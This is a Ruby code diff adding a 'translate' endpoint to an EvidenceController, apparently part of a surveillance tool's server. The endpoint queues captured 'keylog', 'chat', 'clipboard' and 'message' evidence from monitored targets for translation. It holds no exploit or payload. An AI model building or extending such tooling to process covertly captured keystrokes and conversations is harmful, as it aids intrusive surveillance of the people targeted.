@@ -151,6 +151,26 @@ class EvidenceController < RESTController
     return ok
   end
 
+  def translate
+    require_auth_level :view
+
+    mongoid_query do
+      target = Item.where({_id: @params['target']}).first
+      return not_found("Target not found: #{@params['target']}") if target.nil?
+
+      evidence = Evidence.collection_class(target[:_id]).find(@params['_id'])
+
+      # add to the translation queue
+      if LicenseManager.instance.check(:translation) and ['keylog', 'chat', 'clipboard', 'message'].include? evidence.type
+        TransQueue.add(target._id, evidence._id)
+        evidence.data[:tr] = "Translation queued..."
+        evidence.save
+      end
+
+      return ok
+    end
+  end
+
   def body
     require_auth_level :view
 
